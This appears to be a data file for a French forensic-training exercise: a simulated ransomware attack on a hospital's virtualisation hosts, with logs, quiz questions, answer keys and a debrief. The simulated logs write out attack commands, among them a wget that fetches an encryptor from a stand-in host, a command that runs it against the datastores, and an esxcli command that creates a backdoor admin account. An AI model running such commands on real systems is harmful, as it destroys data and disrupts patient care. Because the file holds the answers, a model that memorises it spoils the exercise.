/* Open-Forensics — CAS-10. AVERTISSEMENT : contient les réponses attendues. */
(function (root) {
  'use strict';

  root.OpenForensics.cases.push({
    id: 'CAS-10',
    title: 'Chiffrement de l\'hyperviseur d\'un centre hospitalier',
    client: 'Centre hospitalier Beauregard — 420 lits, 1 900 agents',
    difficulty: 'difficile',
    estimatedMin: 95,
    tags: ['rançongiciel', 'hyperviseur', 'accès prestataire'],

    env: {
      domain: 'BEAUREGARD', dns: 'ch-beauregard.lan', mail: 'ch-beauregard.example',
      lan: '10.101.3', edge: '198.51.100.140',
      hosts: ['ESX-01', 'ESX-02', 'ESX-03', 'SRV-VCENTER', 'SRV-AD-11', 'SRV-SAUV-01', 'PC-BIOMED-02'],
      users: ['k.ferreira', 'n.bouchard', 'y.said', 'l.chan'],
      admins: ['adm_si', 'svc_biomed'],
      vms: ['VM-DPI-01', 'VM-PACS-01', 'VM-LABO-01', 'VM-AD-02', 'VM-SAUV-02', 'VM-GRH-01']
    },

    brief: {
      saisine: 'Samedi 20 décembre 2026, 22h15. Le dossier patient informatisé devient inaccessible, puis l\'imagerie, puis le laboratoire. Le plan blanc est déclenché à 22h40 : retour au papier, déroutement des urgences. Une note de rançon est trouvée sur la console de l\'hyperviseur. La direction demande une première restitution sous quarante-huit heures.',
      perimetre: 'Trois hôtes de virtualisation portant quarante-deux machines virtuelles, un serveur de gestion de la virtualisation, un domaine Active Directory, un dépôt de sauvegarde sur machine virtuelle. Accès distant des prestataires par réseau privé virtuel ; le compte de maintenance biomédicale bénéficie d\'une dérogation à l\'authentification forte.',
      collecte: 'Journaux du concentrateur d\'accès distant, du serveur de gestion de la virtualisation, des trois hôtes, du contrôleur de domaine, du pare-feu et du logiciel de sauvegarde, du 10 au 21 décembre. Horodatages en UTC.',
      limites: 'Les machines virtuelles chiffrées ne sont pas exploitables : leurs journaux internes sont perdus. Le journal du serveur de gestion de la virtualisation est intact, celui des hôtes également. Aucune sonde réseau interne : les flux entre hôtes ne sont pas journalisés.',
      mission: 'Établir le point d\'entrée, la chronologie, l\'étendue exacte du chiffrement, l\'état des sauvegardes, et déterminer si des données de santé ont quitté l\'établissement. Cette dernière réponse conditionne la notification aux patients.'
    },

    evidence: [
      {
        id: 'PJ-01', source: 'reseau', system: 'Concentrateur d\'accès distant',
        title: 'Journal du réseau privé virtuel',
        note: 'Les comptes de prestataires sont identifiables au préfixe svc_. Le champ mfa indique si l\'authentification forte a été exigée.',
        lines: [
          { t: '2026-12-19 19:58:12', m: 'event=auth_failure user=adm_si src_ip=192.0.2.88 reason=bad_password attempt=1' },
          { t: '2026-12-19 19:58:41', m: 'event=auth_failure user=n.bouchard src_ip=192.0.2.88 reason=bad_password attempt=1' },
          { t: '2026-12-19 19:59:20', m: 'event=auth_failure user=svc_maintenance src_ip=192.0.2.88 reason=unknown_user attempt=1' },
          { t: '2026-12-19 20:04:33', m: 'event=tunnel_up user=svc_biomed src_ip=192.0.2.88 assigned_ip=10.99.2.17 mfa=exempted client=OpenConnect/9.01 note="derogation MFA prestataire biomedical"' },
          { t: '2026-12-19 23:41:02', m: 'event=tunnel_down user=svc_biomed duration_s=12989 bytes_in=88204112 bytes_out=12044820' },
          { t: '2026-12-20 20:31:44', m: 'event=tunnel_up user=svc_biomed src_ip=192.0.2.88 assigned_ip=10.99.2.21 mfa=exempted client=OpenConnect/9.01' },
          { t: '2026-12-20 23:02:18', m: 'event=tunnel_down user=svc_biomed duration_s=8794 bytes_in=41202118 bytes_out=6820441' },
          { t: '2026-12-12 08:14:02', m: 'event=tunnel_up user=svc_biomed src_ip=203.0.113.140 assigned_ip=10.99.2.9 mfa=exempted client=6.2.1 note="intervention planifiee, adresse habituelle du prestataire"' }
        ],
        noise: [{ family: 'vpn', count: 320, from: '2026-12-10 05:00:00', to: '2026-12-21 19:00:00' }]
      },
      {
        id: 'PJ-02', source: 'journaux', system: 'SRV-VCENTER',
        title: 'Journal du serveur de gestion de la virtualisation',
        note: 'Trace les authentifications à l\'interface, les tâches lancées sur les hôtes et les opérations sur les machines virtuelles. C\'est la pièce maîtresse du dossier.',
        lines: [
          { t: '2026-12-19 20:31:05', m: 'event=UserLoginSessionEvent user=BEAUREGARD\\svc_biomed src_ip=10.99.2.17 resultat=succes note="premiere connexion de ce compte a l interface de gestion"' },
          { t: '2026-12-19 20:44:18', m: 'event=RoleAssignment user=svc_biomed role=Administrateur scope=Datacenter herite_de=groupe_Biomedical note="droits herites lors de la migration de 2024"' },
          { t: '2026-12-19 21:02:41', m: 'task=HostServiceStart entity=ESX-01 service=TSM-SSH user=svc_biomed resultat=succes' },
          { t: '2026-12-19 21:03:10', m: 'task=HostServiceStart entity=ESX-02 service=TSM-SSH user=svc_biomed resultat=succes' },
          { t: '2026-12-19 21:03:44', m: 'task=HostServiceStart entity=ESX-03 service=TSM-SSH user=svc_biomed resultat=succes' },
          { t: '2026-12-19 21:05:02', m: 'event=AlarmSshEnabled entity=ESX-01 severite=warning note="alarme generee, aucun destinataire configure"' },
          { t: '2026-12-19 22:18:33', m: 'task=RemoveSnapshot entity=VM-DPI-01 user=svc_biomed resultat=succes snapshots_supprimes=4' },
          { t: '2026-12-19 22:24:50', m: 'task=RemoveSnapshot entity=VM-PACS-01 user=svc_biomed resultat=succes snapshots_supprimes=3' },
          { t: '2026-12-20 21:40:12', m: 'task=PowerOffVM entity=VM-DPI-01 user=svc_biomed resultat=succes' },
          { t: '2026-12-20 21:40:31', m: 'task=PowerOffVM entity=VM-PACS-01 user=svc_biomed resultat=succes' },
          { t: '2026-12-20 21:44:02', m: 'task=PowerOffVM_batch user=svc_biomed entites=14 resultat=succes note="quatorze machines virtuelles arretees en quatre minutes"' },
          { t: '2026-12-20 22:47:19', m: 'event=HostConnectionLost entity=ESX-01 note="interface de gestion injoignable"' },
          { t: '2026-12-12 09:02:11', m: 'event=UserLoginSessionEvent user=BEAUREGARD\\adm_si src_ip=10.101.3.40 resultat=succes note="administration courante"' }
        ],
        noise: [{ family: 'hyperviseur', count: 340, from: '2026-12-10 05:00:00', to: '2026-12-21 19:00:00' }]
      },
      {
        id: 'PJ-03', source: 'journaux', system: 'ESX-01, ESX-02, ESX-03',
        title: 'Journaux d\'authentification et d\'exécution des hôtes',
        note: 'Les hôtes journalisent les connexions au shell, les créations de comptes locaux et les commandes lancées. Ces journaux sont restés intacts.',
        lines: [
          { t: '2026-12-19 21:08:22', m: 'host=ESX-01 sshd: Accepted keyboard-interactive for root from 10.99.2.17 port 51204' },
          { t: '2026-12-19 21:18:40', m: 'host=ESX-01 esxcli: account add -i vpxuser2 -p ****** -r Admin executed_by=root from=10.99.2.17' },
          { t: '2026-12-19 21:19:02', m: 'host=ESX-02 esxcli: account add -i vpxuser2 -p ****** -r Admin executed_by=root from=10.99.2.17' },
          { t: '2026-12-19 21:19:31', m: 'host=ESX-03 esxcli: account add -i vpxuser2 -p ****** -r Admin executed_by=root from=10.99.2.17' },
          { t: '2026-12-19 21:26:15', m: 'host=ESX-01 shell: wget https://depot-outils-vm.test/hv/enc64 -O /tmp/.hv executed_by=root' },
          { t: '2026-12-19 21:27:02', m: 'host=ESX-01 shell: chmod +x /tmp/.hv sha256=c41f5b67acdebe079a0820ce5de9c6ee4ee61daa256a0c24bbcc169cef640590' },
          { t: '2026-12-20 21:55:08', m: 'host=ESX-01 shell: /tmp/.hv --path /vmfs/volumes/DATASTORE-01 --ext hvlock --threads 8 executed_by=root' },
          { t: '2026-12-20 21:55:20', m: 'host=ESX-02 shell: /tmp/.hv --path /vmfs/volumes/DATASTORE-02 --ext hvlock --threads 8 executed_by=root' },
          { t: '2026-12-20 21:55:33', m: 'host=ESX-03 shell: /tmp/.hv --path /vmfs/volumes/DATASTORE-03 --ext hvlock --threads 8 executed_by=root' },
          { t: '2026-12-20 22:12:44', m: 'host=ESX-01 shell: fichiers traites=1184 extension=.hvlock note depose=/vmfs/volumes/DATASTORE-01/RESTAURATION-URGENTE.hvlock.txt' },
          { t: '2026-12-20 22:46:02', m: 'host=ESX-01 hostd: arret du service de gestion demande par root' },
          { t: '2026-12-19 21:40:11', m: 'host=ESX-01 shell: esxcli storage filesystem list executed_by=root' }
        ],
        noise: [{ family: 'auditd', count: 320, from: '2026-12-10 05:00:00', to: '2026-12-21 19:00:00', vars: { hosts: ['ESX-01', 'ESX-02', 'ESX-03'] } }]
      },
      {
        id: 'PJ-04', source: 'journaux', system: 'SRV-SAUV-01',
        title: 'Journal du logiciel de sauvegarde',
        note: 'Le dépôt principal est une machine virtuelle hébergée sur l\'un des hôtes. Une copie hebdomadaire est envoyée sur bande, stockée hors ligne.',
        lines: [
          { t: '2026-12-19 22:31:40', m: 'depot=principal action=suppression_points user=svc_biomed points_supprimes=112 note="suppression via l interface d administration"' },
          { t: '2026-12-20 02:00:04', m: 'job=sauvegarde-quotidienne statut=echec message="depot principal inaccessible"' },
          { t: '2026-12-20 21:44:00', m: 'depot=principal etat=machine_virtuelle_arretee vm=VM-SAUV-02 hote=ESX-02' },
          { t: '2026-12-20 22:03:12', m: 'depot=principal etat=chiffre extension_detectee=.hvlock' },
          { t: '2026-12-14 23:10:00', m: 'job=copie-bande statut=succes volumes=6 destination="coffre externe" note="derniere copie hors ligne, sortie du site le 15 decembre"' },
          { t: '2026-12-21 08:02:00', m: 'inventaire_bandes statut=verifie volumes=6 lisibles=6 date_donnees=2026-12-14 note="restauration possible avec six jours de perte"' }
        ],
        noise: [{ family: 'saas', count: 220, from: '2026-12-10 05:00:00', to: '2026-12-21 19:00:00', vars: { users: ['adm_si', 'n.bouchard', 'y.said'] } }]
      },
      {
        id: 'PJ-05', source: 'journaux', system: 'SRV-AD-11',
        title: 'Journal de sécurité du contrôleur de domaine',
        note: 'Le contrôleur de domaine est resté opérationnel : sa machine virtuelle était hébergée sur un hôte dont le volume de démarrage n\'a pas été traité.',
        lines: [
          { t: '2026-12-19 20:30:41', m: 'EventCode=4624 Logon_Type=3 Account_Name=svc_biomed Computer=SRV-VCENTER Source_Network_Address=10.99.2.17 Authentication_Package=Kerberos' },
          { t: '2026-12-19 21:55:02', m: 'EventCode=4662 Object_Type=user Object_Name=CN=adm_si Account_Name=svc_biomed Client_Address=10.99.2.17 Access=Read_Property note="lecture des attributs, aucune modification"' },
          { t: '2026-12-19 22:01:33', m: 'EventCode=4625 Logon_Type=3 Account_Name=adm_si Computer=SRV-AD-11 Source_Network_Address=10.99.2.17 Failure_Reason=Bad_Password attempt=4' },
          { t: '2026-12-20 21:38:12', m: 'EventCode=4624 Logon_Type=3 Account_Name=svc_biomed Computer=SRV-VCENTER Source_Network_Address=10.99.2.21' },
          { t: '2026-12-21 07:02:00', m: 'EventCode=4724 Target_Account=svc_biomed Subject_Account=adm_si note="reinitialisation lors de la reponse a incident"' }
        ],
        noise: [{ family: 'win-security', count: 300, from: '2026-12-10 05:00:00', to: '2026-12-21 19:00:00' }]
      },
      {
        id: 'PJ-06', source: 'reseau', system: 'Pare-feu périmétrique',
        title: 'Journal du pare-feu et synthèses de volumétrie',
        note: 'Les synthèses quotidiennes donnent le volume sortant total par plage d\'adresses, avec une moyenne glissante sur trente jours.',
        lines: [
          { t: '2026-12-19 21:26:14', m: 'src=10.101.3.11 dst=203.0.113.190 dport=443 proto=tcp action=ALLOW bytes_in=8204118 bytes_out=4820 note="telechargement depuis depot-outils-vm.test"' },
          { t: '2026-12-20 06:00:00', m: 'egress_summary window=2026-12-19 src=10.101.3.0/24 total_bytes_out=214880114 moyenne_30j=198204118 ecart=+8_pourcent' },
          { t: '2026-12-21 06:00:00', m: 'egress_summary window=2026-12-20 src=10.101.3.0/24 total_bytes_out=188204551 moyenne_30j=198204118 ecart=-5_pourcent note="aucun transfert massif sortant sur la periode"' },
          { t: '2026-12-21 06:00:01', m: 'egress_summary window=2026-12-19/2026-12-20 src=10.99.2.0/24 total_bytes_out=18865261 note="trafic du tunnel prestataire, conforme a une session d administration"' }
        ],
        noise: [{ family: 'firewall', count: 340, from: '2026-12-10 05:00:00', to: '2026-12-21 19:00:00' }]
      }
    ],

    questions: [
      { id: 'Q1', type: 'text', label: 'Compte utilisé pour entrer dans le système d\'information',
        answer: 'svc_biomed',
        hint: 'Trois tentatives échouent sur d\'autres comptes avant qu\'une session ne s\'ouvre.',
        where: 'PJ-01, tunnel_up du 19 décembre à 20:04:33.',
        why: 'Compte de maintenance biomédicale, exempté d\'authentification forte : la dérogation est la cause racine du dossier.' },

      { id: 'Q2', type: 'ip', label: 'Adresse IP de l\'attaquant',
        answer: '192.0.2.88',
        hint: 'Comparez-la à l\'adresse utilisée par le prestataire lors de son intervention planifiée du 12 décembre.',
        where: 'PJ-01, à comparer avec 203.0.113.140 le 12 décembre.',
        why: 'Même compte, deux adresses, deux clients logiciels différents : la distinction entre la session légitime et la session frauduleuse tient dans ces deux champs.' },

      { id: 'Q3', type: 'number', label: 'Nombre de tentatives d\'authentification échouées avant la connexion réussie',
        answer: '3',
        hint: 'Elles concernent trois comptes différents, dont un qui n\'existe pas.',
        where: 'PJ-01, lignes de 19:58:12 à 19:59:20.',
        why: 'Trois comptes essayés en quatre-vingts secondes, dont un inexistant : c\'est une liste d\'identifiants testée, pas une erreur de saisie. Aucune alerte n\'a été générée.' },

      { id: 'Q4', type: 'datetime', label: 'Horodatage de la première connexion à l\'interface de gestion de la virtualisation (UTC)',
        answer: '2026-12-19 20:31',
        hint: 'Le journal du serveur de gestion signale une première connexion pour ce compte.',
        where: 'PJ-02, UserLoginSessionEvent avec la note « première connexion de ce compte ».',
        why: 'Un compte de maintenance biomédicale n\'avait aucune raison de se connecter à l\'hyperviseur : la première connexion d\'un compte à un système est en soi un évènement à surveiller.' },

      { id: 'Q5', type: 'choice', label: 'Comment ce compte a-t-il obtenu les droits d\'administration de la virtualisation ?',
        answer: 'Par héritage d\'un groupe, lors d\'une migration antérieure',
        options: [
          'Par exploitation d\'une vulnérabilité du serveur de gestion',
          'Par héritage d\'un groupe, lors d\'une migration antérieure',
          'Par vol du mot de passe du compte adm_si',
          'Par création d\'un rôle sur mesure pendant la session'
        ],
        hint: 'Le journal du serveur de gestion indique l\'origine du rôle attribué au compte.',
        where: 'PJ-02, RoleAssignment à 20:44:18 : rôle Administrateur au niveau Datacenter, hérité du groupe Biomédical depuis la migration de 2024.',
        why: 'Aucune vulnérabilité, aucun vol : une attribution de droits jamais revue depuis deux ans. La tentative sur adm_si a d\'ailleurs échoué (PJ-05). C\'est une revue de droits qui manquait, pas un correctif.' },

      { id: 'Q6', type: 'datetime', label: 'Horodatage de l\'activation du service SSH sur le premier hôte (UTC)',
        answer: '2026-12-19 21:02',
        hint: 'Trois tâches identiques se suivent en moins d\'une minute.',
        where: 'PJ-02, HostServiceStart sur ESX-01, ESX-02 puis ESX-03.',
        why: 'Le service SSH est désactivé par défaut sur ces hôtes. Son activation a généré une alarme — sans destinataire configuré, donc sans effet.' },

      { id: 'Q7', type: 'number', label: 'Nombre d\'hôtes de virtualisation sur lesquels SSH a été activé',
        answer: '3',
        hint: 'Les tâches sont journalisées une par hôte.',
        where: 'PJ-02, trois tâches HostServiceStart entre 21:02:41 et 21:03:44.',
        why: 'L\'attaquant prépare les trois hôtes dès le premier soir, mais ne chiffre que le lendemain : la fenêtre de vingt-quatre heures était une occasion de détection.' },

      { id: 'Q8', type: 'text', label: 'Nom du compte local créé sur les hôtes',
        answer: 'vpxuser2',
        hint: 'Une commande esxcli crée un compte administrateur sur chaque hôte.',
        where: 'PJ-03, trois commandes account add entre 21:18:40 et 21:19:31.',
        why: 'Le nom imite le compte de service légitime du serveur de gestion. Il doit être supprimé sur les trois hôtes lors de la remise en service, faute de quoi l\'accès reste ouvert.' },

      { id: 'Q9', type: 'text', label: 'Extension ajoutée aux fichiers chiffrés',
        answer: 'hvlock', alt: ['.hvlock'],
        hint: 'Elle figure dans les arguments du chiffreur et dans le journal de la sauvegarde.',
        where: 'PJ-03 (--ext hvlock) et PJ-04 (extension_detectee).',
        why: 'L\'extension et le nom de la note permettent de rechercher un déchiffreur public et d\'identifier le mode opératoire.' },

      { id: 'Q10', type: 'text', label: 'Nom du fichier de demande de rançon',
        answer: 'RESTAURATION-URGENTE.hvlock.txt', alt: ['restauration-urgente.hvlock.txt', 'RESTAURATION-URGENTE'],
        hint: 'Il est déposé à la racine du premier volume traité.',
        where: 'PJ-03, ligne de 22:12:44.',
        why: 'Pièce à conserver intacte : elle porte l\'identifiant de victime et le moyen de contact, éléments nécessaires au dépôt de plainte.' },

      { id: 'Q11', type: 'number', label: 'Nombre de machines virtuelles arrêtées avant le chiffrement',
        answer: '14',
        hint: 'Une opération groupée est journalisée après deux arrêts individuels.',
        where: 'PJ-02, PowerOffVM_batch du 20 décembre à 21:44:02.',
        why: 'Arrêter les machines avant de chiffrer garantit des fichiers de disque cohérents et donc irrécupérables : c\'est une marque de préparation, et cela date précisément le début de l\'impact.' },

      { id: 'Q12', type: 'hash', label: 'Empreinte SHA-256 du binaire de chiffrement',
        answer: 'c41f5b67acdebe079a0820ce5de9c6ee4ee61daa256a0c24bbcc169cef640590',
        hint: 'Elle est journalisée au moment où le binaire est rendu exécutable.',
        where: 'PJ-03, commande chmod du 19 décembre à 21:27:02.',
        why: 'Le binaire a été déposé vingt-quatre heures avant son exécution : l\'empreinte permet de vérifier sa présence éventuelle ailleurs dans le parc.' },

      { id: 'Q13', type: 'domain', label: 'Domaine depuis lequel le chiffreur a été téléchargé',
        answer: 'depot-outils-vm.test',
        hint: 'Une commande wget figure dans le journal du premier hôte, et le pare-feu journalise le flux correspondant.',
        where: 'PJ-03 (wget) et PJ-06 (flux vers 203.0.113.190).',
        why: 'Indicateur à transmettre immédiatement : il permet de rechercher la même compromission chez d\'autres établissements du groupement hospitalier.' },

      { id: 'Q14', type: 'choice', label: 'Quel est l\'état des sauvegardes ?',
        answer: 'Le dépôt principal est détruit, mais une copie hors ligne du 14 décembre reste exploitable',
        options: [
          'Toutes les sauvegardes sont détruites, aucune restauration n\'est possible',
          'Le dépôt principal est détruit, mais une copie hors ligne du 14 décembre reste exploitable',
          'Les sauvegardes sont intactes, la restauration est immédiate',
          'Indéterminable : le serveur de sauvegarde est chiffré'
        ],
        hint: 'Le dépôt principal était une machine virtuelle. Cherchez s\'il existait un autre support, et où il se trouvait le 20 décembre.',
        where: 'PJ-04 : suppression de 112 points le 19 décembre, dépôt chiffré le 20, mais copie sur bande du 14 décembre sortie du site le 15, et inventaire du 21 confirmant six volumes lisibles.',
        why: 'C\'est la réponse que la direction attend en premier. La copie hors ligne, hors d\'atteinte parce que physiquement sortie du site, permet une reprise avec six jours de perte de données. Répondre « indéterminable » ou « tout est détruit » enverrait l\'établissement vers une négociation dont il n\'a pas besoin.' },

      { id: 'Q15', type: 'choice', label: 'Des données de santé ont-elles été exfiltrées ?',
        answer: 'Non : aucun volume sortant anormal sur la période',
        options: [
          'Oui : 88 Mo sont sortis par le tunnel du prestataire',
          'Oui : les données ont été envoyées vers depot-outils-vm.test',
          'Non : aucun volume sortant anormal sur la période',
          'Indéterminable : les machines virtuelles chiffrées ne sont pas exploitables'
        ],
        hint: 'Comparez les synthèses de volumétrie sortante des 19 et 20 décembre à la moyenne des trente jours, et regardez le sens des transferts du tunnel.',
        where: 'PJ-06 : +8 % le 19 décembre, −5 % le 20, et 18 Mo sortants côté tunnel prestataire, conformes à une session d\'administration. Le flux vers depot-outils-vm.test est entrant (8 Mo reçus, 4,8 Ko envoyés).',
        why: 'La question détermine la notification aux patients. Le piège est le champ bytes_in du tunnel : 88 Mo sont entrés dans le réseau, ils n\'en sont pas sortis. Confondre le sens d\'un transfert conduirait à annoncer à tort une fuite de données de santé à 420 lits de patients.' }
    ],

    events: [
      { id: 'EV-01', t: '2026-12-19 20:04', label: 'Connexion au réseau privé virtuel après trois échecs, sans authentification forte' },
      { id: 'EV-02', t: '2026-12-19 20:31', label: 'Première connexion du compte à l\'interface de gestion de la virtualisation' },
      { id: 'EV-03', t: '2026-12-19 21:02', label: 'Activation du service SSH sur les trois hôtes' },
      { id: 'EV-04', t: '2026-12-19 21:18', label: 'Création d\'un compte administrateur local sur les trois hôtes' },
      { id: 'EV-05', t: '2026-12-19 21:26', label: 'Téléchargement du chiffreur sur le premier hôte' },
      { id: 'EV-06', t: '2026-12-19 21:40', label: 'Inventaire des volumes de stockage des hôtes' },
      { id: 'EV-07', t: '2026-12-19 22:18', label: 'Suppression des instantanés des machines virtuelles critiques' },
      { id: 'EV-08', t: '2026-12-19 22:31', label: 'Suppression de 112 points de restauration sur le dépôt de sauvegarde' },
      { id: 'EV-09', t: '2026-12-20 21:44', label: 'Arrêt groupé de quatorze machines virtuelles' },
      { id: 'EV-10', t: '2026-12-20 21:55', label: 'Lancement du chiffrement sur les trois volumes de stockage' },
      { id: 'EV-11', t: '2026-12-19 22:01', label: 'Tentative d\'authentification sur le compte d\'administration du domaine, échouée' },
      { id: 'EV-12', t: '2026-12-14 23:10', label: 'Copie hebdomadaire sur bande, sortie du site le lendemain' },
      { id: 'EV-13', t: '2026-12-12 08:14', label: 'Intervention planifiée du prestataire depuis son adresse habituelle' }
    ],

    chain: [
      { tactic: 'Accès initial', event: 'EV-01', technique: 'T1133', techniqueAlt: ['T1078', 'T1078.002'],
        where: 'PJ-01, trois échecs puis une session ouverte avec un compte exempté d\'authentification forte.',
        why: 'La dérogation accordée au prestataire biomédical est le point d\'entrée. Aucune vulnérabilité technique n\'a été exploitée pour entrer.' },
      { tactic: 'Exécution', event: 'EV-10', technique: 'T1059.004',
        where: 'PJ-03, lancement de /tmp/.hv sur les trois hôtes en vingt-cinq secondes.',
        why: 'L\'exécution est simultanée sur les trois hôtes : l\'attaquant avait préparé ses accès la veille et n\'a eu qu\'à lancer trois commandes.' },
      { tactic: 'Persistance', event: 'EV-04', technique: 'T1136.001',
        where: 'PJ-03, création du compte vpxuser2 avec le rôle Admin sur ESX-01, ESX-02 et ESX-03.',
        why: 'Ce compte survit à la réinitialisation du compte svc_biomed. Il doit être supprimé sur les trois hôtes, sans quoi la remise en service rouvre la porte.' },
      { tactic: 'Élévation de privilèges', event: 'NONE', technique: 'NONE',
        where: 'Aucune : les droits d\'administration de la virtualisation étaient déjà attachés au compte par héritage de groupe.',
        why: 'C\'est le constat le plus dérangeant du dossier : il n\'y a pas eu d\'élévation parce qu\'il n\'y en avait pas besoin. Une revue de droits annuelle aurait supprimé le scénario entier.' },
      { tactic: 'Contournement des défenses', event: 'EV-03', technique: 'T1562.001', techniqueAlt: ['T1562.004'],
        where: 'PJ-02, activation du service SSH sur les trois hôtes, alarme générée sans destinataire ; PJ-03, arrêt du service de gestion après chiffrement.',
        why: 'L\'alarme existait, elle s\'est déclenchée, et personne ne l\'a reçue. Une alarme sans destinataire est un contrôle qui n\'existe pas.' },
      { tactic: 'Accès aux identifiants', event: 'NONE', technique: 'NONE',
        where: 'PJ-05 : lecture des attributs du compte adm_si, puis quatre tentatives d\'authentification échouées. Aucun vidage de mémoire, aucun vol abouti.',
        why: 'La tentative sur le compte d\'administration du domaine a échoué : l\'attaquant n\'a jamais tenu l\'annuaire, seulement la virtualisation. La distinction change le périmètre de la reconstruction.' },
      { tactic: 'Découverte', event: 'EV-06', technique: 'T1082', techniqueAlt: ['T1083'],
        where: 'PJ-03, esxcli storage filesystem list sur le premier hôte.',
        why: 'L\'attaquant cartographie les volumes avant de chiffrer : c\'est ce qui lui permet de viser les trois banques de données et le dépôt de sauvegarde du premier coup.' },
      { tactic: 'Déplacement latéral', event: 'EV-04', technique: 'T1021.004', techniqueAlt: ['T1021.001'],
        where: 'PJ-03, sessions SSH ouvertes depuis 10.99.2.17 vers les trois hôtes.',
        why: 'Le déplacement se fait entièrement par le serveur de gestion, avec des fonctions d\'administration légitimes : aucun outil offensif n\'a été nécessaire pour circuler.' },
      { tactic: 'Collecte', event: 'NONE', technique: 'NONE',
        where: 'Aucun archivage, aucune lecture massive de fichiers, aucune copie vers un répertoire de regroupement.',
        why: 'Cohérent avec l\'absence d\'exfiltration : ce mode opératoire ne pratique pas la double extorsion.' },
      { tactic: 'Commande et contrôle', event: 'NONE', technique: 'NONE',
        where: 'Aucune balise, aucun canal sortant : l\'attaquant travaille directement dans les sessions ouvertes par le tunnel.',
        why: 'Le seul flux sortant vers Internet est le téléchargement du chiffreur, dans le sens entrant. Chercher un canal de commande ici ne donne rien.' },
      { tactic: 'Exfiltration', event: 'NONE', technique: 'NONE',
        where: 'PJ-06, volumétrie sortante à +8 % puis −5 % de la moyenne trentenaire ; le flux du 19 décembre est entrant.',
        why: 'Cette conclusion évite une notification aux patients infondée. Elle repose sur deux synthèses indépendantes et sur la lecture correcte du sens des transferts.' },
      { tactic: 'Impact', event: 'EV-10', technique: 'T1486', techniqueAlt: ['T1490', 'T1489'],
        where: 'PJ-03 (chiffrement des trois banques de données, note déposée) et PJ-04 (dépôt de sauvegarde chiffré).',
        why: 'L\'impact est vital au sens propre : plan blanc, retour au papier, déroutement des urgences. Il commence à l\'arrêt des machines virtuelles, pas au chiffrement.' }
    ],

    keyIndicators: ['192.0.2.88', 'svc_biomed', 'vpxuser2', 'hvlock', 'depot-outils-vm.test', 'RESTAURATION-URGENTE.hvlock.txt', 'ESX-01'],

    iocs: [
      { type: 'Adresse IP', value: '192.0.2.88', context: 'Source des deux sessions frauduleuses des 19 et 20 décembre.' },
      { type: 'Compte', value: 'vpxuser2', context: 'Compte administrateur local créé sur les trois hôtes de virtualisation.' },
      { type: 'Domaine', value: 'depot-outils-vm.test', context: 'Distribution du chiffreur, résolu en 203.0.113.190.' },
      { type: 'Empreinte SHA-256', value: 'c41f5b67acdebe079a0820ce5de9c6ee4ee61daa256a0c24bbcc169cef640590', context: 'Binaire de chiffrement déposé dans /tmp/.hv.' },
      { type: 'Extension', value: '.hvlock', context: 'Extension appliquée aux fichiers des banques de données.' },
      { type: 'Nom de fichier', value: 'RESTAURATION-URGENTE.hvlock.txt', context: 'Note de rançon déposée à la racine des volumes.' },
      { type: 'Motif de détection', value: 'Activation du service SSH sur un hôte de virtualisation', context: 'Alarme native existante : à router vers une boîte réellement surveillée.' }
    ],

    debrief: {
      story: 'Le 19 décembre à 19h58, trois comptes sont essayés sur le concentrateur d\'accès distant, dont un qui n\'existe pas. À 20h04, la quatrième tentative aboutit avec svc_biomed, compte de maintenance biomédicale exempté d\'authentification forte. À 20h31, ce compte se connecte pour la première fois de son existence à l\'interface de gestion de la virtualisation, où il dispose — par héritage d\'un groupe jamais revu depuis la migration de 2024 — du rôle d\'administrateur sur l\'ensemble du centre de données. En une heure, l\'attaquant active SSH sur les trois hôtes, y crée un compte administrateur local vpxuser2, télécharge son chiffreur, inventorie les volumes de stockage, supprime les instantanés des machines critiques et 112 points de restauration du dépôt de sauvegarde. Puis il se déconnecte. Il revient le lendemain à 20h31 : arrêt groupé de quatorze machines virtuelles à 21h44, chiffrement simultané des trois banques de données à 21h55, note de rançon déposée, service de gestion arrêté. Le dossier patient tombe à 22h12, le plan blanc est déclenché à 22h40. Aucune donnée n\'est sortie du réseau, et une copie de sauvegarde sur bande, sortie du site le 15 décembre, reste lisible.',
      lessons: [
        'Vingt-quatre heures séparent la préparation du déclenchement. Activation de SSH, création de comptes locaux, suppression d\'instantanés, suppression de points de restauration : quatre évènements majeurs, tous journalisés, tous passés inaperçus le premier soir. C\'est là que se joue la détection, pas au moment du chiffrement.',
        'L\'alarme d\'activation SSH s\'est bien déclenchée — sans destinataire configuré. Un contrôle dont personne ne reçoit la sortie n\'est pas un contrôle. Cette ligne vaut à elle seule une recommandation.',
        'Le sens des transferts se lit dans les champs : 88 Mo entrants par le tunnel ne sont pas 88 Mo exfiltrés, et le flux vers le dépôt d\'outils est entrant. Confondre bytes_in et bytes_out ferait notifier à tort une fuite de données de santé.',
        'La copie hors ligne du 14 décembre est ce qui sépare une reprise en six jours d\'une négociation avec des criminels. Le seul support qui a survécu est celui qui avait physiquement quitté le site : la règle des sauvegardes hors ligne se démontre ici en une ligne de journal.',
        'Il n\'y a eu ni élévation de privilèges, ni exploitation de vulnérabilité, ni vol d\'identifiants abouti. Une revue annuelle des attributions de rôles sur l\'hyperviseur aurait supprimé le scénario entier.'
      ],
      pitfalls: [
        'Dater l\'incident du 20 décembre au soir : la compromission commence la veille à 20h04, et c\'est cette date qui borne l\'investigation.',
        'Annoncer une exfiltration de données de santé en lisant le champ bytes_in du tunnel comme un volume sortant.',
        'Conclure que toutes les sauvegardes sont perdues sans chercher la copie hors ligne, et pousser l\'établissement vers une négociation inutile.',
        'Oublier le compte vpxuser2 sur les trois hôtes lors de la remise en service, après avoir réinitialisé svc_biomed.',
        'Conclure à une compromission du domaine Active Directory : les tentatives sur adm_si ont échoué et le contrôleur est resté opérationnel.'
      ]
    }
  });
})(typeof globalThis !== 'undefined' ? globalThis : this);
